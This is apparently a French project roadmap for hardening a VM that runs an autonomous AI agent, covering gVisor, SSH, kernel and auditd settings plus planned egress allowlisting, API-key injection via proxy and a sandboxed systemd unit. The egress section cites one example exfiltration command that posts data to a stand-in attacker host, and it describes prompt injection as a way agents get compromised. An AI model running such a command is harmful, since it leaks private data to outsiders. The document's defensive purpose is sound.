# 📋 Roadmap & Architecture Sécurisée pour Agent IA (NemoClaw-Grade)

Ce document récapitule l'état actuel de l'infrastructure, les protections déjà déployées et validées, ainsi que la feuille de route pour atteindre le niveau de sécurité complet d'une architecture **NemoClaw** (protection anti-prompt-injection, anti-exfiltration de données et coffre-fort zero-secret).

---

## 🏗️ 1. État Actuel du Projet (100% Déployé & Validé)

L'infrastructure actuelle repose sur une isolation multi-couches de bout en bout :

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  Proxmox VE Hypervisor (Hardware KVM Isolation + QEMU Guest Agent)          │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │  VM Dédiée Ubuntu Server (UFW Rate-Limit + Fail2ban + Auto-Upgrades)  │  │
│  │  ┌─────────────────────────────────────────────────────────────────┐  │  │
│  │  │  Utilisateur sans privilèges (ex: hermes 0750)                   │  │  │
│  │  │  • Sudoers restreint : restart uniquement (pas d'accès aux logs)│  │  │
│  │  │  • Limites anti-DoS (limits.d) : nproc 2048 / nofile 65536      │  │  │
│  │  │  • Podman Rootless (User Namespaces + Cgroups v2 Delegation)    │  │  │
│  │  │  • Compatibilité Docker & Docker Compose transparente           │  │  │
│  │  │  • Python 3.14 via uv + Node.js via NVM                         │  │  │
│  │  │  • Ollama lié strictement sur 127.0.0.1:11434 (Localhost only)  │  │  │
│  │  │  ┌───────────────────────────────────────────────────────────┐  │  │  │
│  │  │  │  Google gVisor Sandbox (runsc Micro-Kernel en espace user)│  │  │  │
│  │  │  │  Runtime OCI par DÉFAUT pour tous les conteneurs          │  │  │  │
│  │  │  └───────────────────────────────────────────────────────────┘  │  │  │
│  │  └─────────────────────────────────────────────────────────────────┘  │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────────────┘
```

### ✅ Protections Système Déjà Actives :
1. **Provisioning Proxmox (OpenTofu)** : Déploiement automatisé Cloud-Init avec support GPU/PCI Passthrough et intégration native `qemu-guest-agent`.
2. **Isolation Noyau (gVisor)** : Tous les conteneurs (`podman run`, `docker run`, `docker compose up`) tournent dans le micro-noyau sécurisé `4.19.0-gvisor`.
3. **Hardening SSH** :
   - Authentification par mot de passe **désactivée**.
   - Connexion root directe **interdite**.
   - Filtrage strict des utilisateurs autorisés : `AllowUsers <admin> <harness>`.
   - Cryptographie moderne et **Post-Quantique** (`sntrup761x25519-sha512@openssh.com`).
   - `AllowTcpForwarding no`, `AllowAgentForwarding no`, `MaxSessions 4`, `UseDNS no`.
4. **Hardening Kernel & OS (Sysctl)** :
   - ASLR complet (`randomize_va_space = 2`), sandboxing mémoire (`yama.ptrace_scope = 1`).
   - Anti-DoS réseau (SYN cookies, RFC1337, ignore bogus ICMP).
   - Filtrage anti-spoofing IPv4 et IPv6 (`rp_filter = 1`, rejet des redirects et source routing).
   - Core dumps désactivés (`fs.suid_dumpable = 0` + `limits.d` + `systemd-coredump`).
   - Blacklist des modules réseau obsolètes (`dccp`, `sctp`, `rds`, `tipc`, `firewire`).
   - Umask `027` par défaut et droits `/home/hermes` en `0750`.
5. **Surveillance & Défense** :
   - `fail2ban` avec action de bannissement automatique UFW.
   - `unattended-upgrades` + `apt-daily.timer` avec nettoyage automatique des anciens noyaux.
   - `auditd` avec règles de traçage sur `/etc/passwd`, `/etc/shadow`, `/etc/sudoers.d`, `/etc/ssh`, `/etc/crontab`, `/etc/environment`.
   - `AppArmor` actif en mode *enforce*.
   - `libpam-pwquality` pour la complexité des mots de passe locaux.

---

## 🎯 2. Roadmap : Prochaines Briques Sécurité (NemoClaw-Grade)

Pour compléter la sécurité et protéger l'agent contre les **attaques par injection de prompt** et le **vol de clés d'API**, voici les phases suivantes à implémenter :

### 🌟 Phase 1 : Proxy Egress L7 & Allowlist de Domaines (*Anti-Exfiltration*)
* **Objectif** : Empêcher un agent compromis d'exfiltrer des fichiers ou des données privées vers un serveur tiers (`curl -X POST https://evil.com/leak`).
* **Implémentation** :
  - Déployer un proxy HTTP/HTTPS local (ex: **Squid** ou **Envoy**) géré en `root` ou sous un utilisateur système dédié `egress-proxy`.
  - Configurer une **Allowlist stricte de domaines autorisés** :
    - *APIs LLM* : `api.openai.com`, `api.anthropic.com`, `openrouter.ai`, `api.groq.com`.
    - *Dépôts & Paquets* : `github.com`, `api.github.com`, `pypi.org`, `files.pythonhosted.org`, `registry.npmjs.org`.
  - Bloquer par défaut tout trafic sortant direct depuis le pare-feu UFW pour l'utilisateur de l'agent, et forcer le passage par `http://127.0.0.1:3128`.

### 🌟 Phase 2 : Architecture "Zero-Secret" (*Injection de Clés API*)
* **Objectif** : Ne **jamais** exposer les vraies clés d'API (OpenAI `sk-...`, Anthropic `sk-ant-...`, GitHub Tokens) à l'agent IA.
* **Implémentation** :
  - L'agent ne reçoit que des jetons factices dans son `.env` (ex: `OPENAI_API_KEY="DUMMY_AGENT_OPENAI_KEY"`).
  - Le proxy local intercepte les requêtes sortantes vers `api.openai.com`, substitue le jeton factice par la vraie clé stockée dans `/etc/security/vault.env` (permissions `0400 root:root`), et transmet la requête signée à OpenAI.
  - *Bénéfice* : Même en cas de prompt injection totale, l'agent ne possède aucune clé réelle en mémoire à faire fuiter.

### 🌟 Phase 3 : Sandboxing Systemd du Service de l'Agent (*Host Process Jail*)
* **Objectif** : Restreindre le processus hôte de l'agent IA lorsqu'il tourne directement sous systemd.
* **Implémentation** :
  - Déployer le fichier de service `/etc/systemd/system/{{ harness_name }}.service` avec :
    ```ini
    [Unit]
    Description=Autonomous AI Agent Service
    After=network.target

    [Service]
    Type=simple
    User={{ harness_name }}
    Group={{ harness_name }}
    WorkingDirectory=/home/{{ harness_name }}
    ExecStart=/usr/local/bin/uv run python main.py
    Restart=always
    RestartSec=5

    # Sandboxing Systemd Strict
    ProtectSystem=strict
    ProtectHome=read-only
    ReadWritePaths=/home/{{ harness_name }}/workspace /tmp
    PrivateTmp=true
    NoNewPrivileges=true
    CapabilityBoundingSet=
    ProtectKernelTunables=true
    ProtectControlGroups=true
    RestrictRealtime=true
    MemoryMax=8G
    CPUQuota=400%
    TasksMax=2048

    [Install]
    WantedBy=multi-user.target
    ```

### 🌟 Phase 4 : Raccourcis Développeur (`Makefile`)
* **Objectif** : Faciliter les opérations quotidiennes en une seule commande.
* **Commandes cibles** :
  - `make deploy` : Lance `tofu apply` puis `ansible-playbook`.
  - `make lint` : Lance `tofu fmt -check`, `tofu validate` et `ansible-lint`.
  - `make ssh` : Connexion SSH directe en tant que harness user.
  - `make restart` : Redémarre le service de l'agent sur la VM.

---

## ⚡ 3. Guide de Reprise Rapide pour la Prochaine Session

### 🔗 Accès SSH Direct :
```bash
# Accès administrateur
ssh ubuntu@10.20.53.2

# Accès harnais IA
ssh hermes@10.20.53.2
```

### 🧪 Vérifications rapides de santé :
```bash
# Vérifier la sandbox gVisor
ssh hermes@10.20.53.2 "docker run --rm alpine uname -a"
# Output attendu : Linux ... 4.19.0-gvisor ...

# Vérifier Ollama en local
ssh hermes@10.20.53.2 "curl -s http://127.0.0.1:11434/api/tags"

# Lancer la validation complète du code local
tofu -chdir=iac validate && ansible-lint
```
